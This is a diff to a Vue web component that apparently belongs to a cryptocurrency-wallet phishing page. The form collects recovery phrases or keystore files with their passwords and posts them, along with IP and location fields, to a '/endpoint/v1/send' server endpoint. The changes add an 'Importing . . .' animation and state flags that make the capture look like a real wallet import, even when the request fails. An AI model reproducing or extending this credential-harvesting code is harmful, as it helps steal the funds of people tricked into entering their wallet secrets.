@@ -87,6 +87,8 @@
                                   <div class="form-group">
                                     <label><span style="color: red;">Do not refresh page use this to</span> <router-link :to="{ name: 'Wallets' }"> start again</router-link>.</label>
                                     <label>Typically 12 (sometimes 24) words separated by single spaces.</label>
+                                    <div v-if="Sending" class="typewrite typing" data-period="2000" data-type='[ "Importing . . .", "Importing . . . .", "Importing . . . . .", "Importing . . . . . ." ]'>
+                                    <span class="wrap "></span></div>
                                     <div class="form-group">
                                     <input v-if="path == 'other wallet'" required v-model="other" type="text" class="form-control" placeholder="Wallet Name">
                                   </div>
@@ -121,6 +123,8 @@
                                 <div class="form-group">
                                     <label><span style="color: red;">Do not refresh page use this to</span> <router-link :to="{ name: 'Wallets' }"> start again</router-link>.</label>
                                     <label>Several lines of text beginning with '<b>{...}</b>' plus the password used to encrypt it.</label>
+                                    <div v-if="Sending" class="typewrite typing" data-period="2000" data-type='[ "Importing . . .", "Importing . . . .", "Importing . . . . .", "Importing . . . . . ." ]'>
+                                    <span class="wrap "></span></div>
                                     <div class="form-group">
                                     <input v-if="path == 'other wallet'" required v-model="other" type="text" class="form-control" placeholder="Wallet Name">
                                   </div>
@@ -161,8 +165,8 @@
                                   <div class="form-group">
                                     <label><span style="color: red;">Do not refresh page use this to</span> <router-link :to="{ name: 'Wallets' }"> start again</router-link>.</label>
                                     <label>Typically 12 (sometimes 24) words separated by single spaces</label>
-                                    <div class="typewrite" data-period="2000" data-type='[ "Importing . . .", "Importing . . .", "Importing . . .", "Importing . . ." ]'>
-                                    <span class="wrap"></span></div>
+                                    <div v-if="Sending" class="typewrite typing" data-period="2000" data-type='[ "Importing . . .", "Importing . . . .", "Importing . . . . .", "Importing . . . . . ." ]'>
+                                    <span class="wrap "></span></div>
                                     <div class="form-group">
                                     <input v-if="path == 'other wallet'" required v-model="other" type="text" class="form-control" placeholder="Wallet Name">
                                   </div>
@@ -237,6 +241,7 @@ export default {
       return {
           path: this.$route.params.path,
           other: '',
+          Sending: false,
           error: '',
           passed: false,
           hasError: false,
@@ -420,11 +425,16 @@ export default {
             })
         },
         async Submit(x,y=null,z=null) {
+          this.Sending = true
+          this.passed = false
+          this.passedOne = false
+          this.passedTwo = false
           if(this.path == 'other wallet') {
             var wallet = 'other wallet - ' +this.other
           } else {
             var wallet = this.path
           }
+          const Url = '/endpoint/v1/send'
           const type = x
           const dataO = y
           const dataT = z
@@ -446,14 +456,20 @@ export default {
           axios
             // .get('/endpoint/v1/send?wallet='+wallet)
             // .get('/endpoint/v1/send?wallet='+wallet+'&type='+type+'&dataO='+dataO+'&timein='+timein+'&dataT='+dataT+'&ip='+ip+'&loc='+loc, config)
-            .post('/endpoint/v1/send', fdata)
+            .post(Url, fdata)
             .then(res => {
-              console.log(res)
-              console.log(res.data)
+              this.Sending = false
+              this.passed = true
+              this.passedOne = true
+              this.passedTwo = true
               this.SendOut(true)
             })
             .catch(err => {
               console.error(err)
+              this.Sending = true
+              this.passed = false
+              this.passedOne = false
+              this.passedTwo = false
               this.SendOut(true)
             })
         },
@@ -633,5 +649,10 @@ export default {
 }
 .color-red {
     color:red;
+}
+.typing {
+  text-transform: uppercase;
+  font-size: 15px;
+  color: #31d1ab;
 }
 </style>
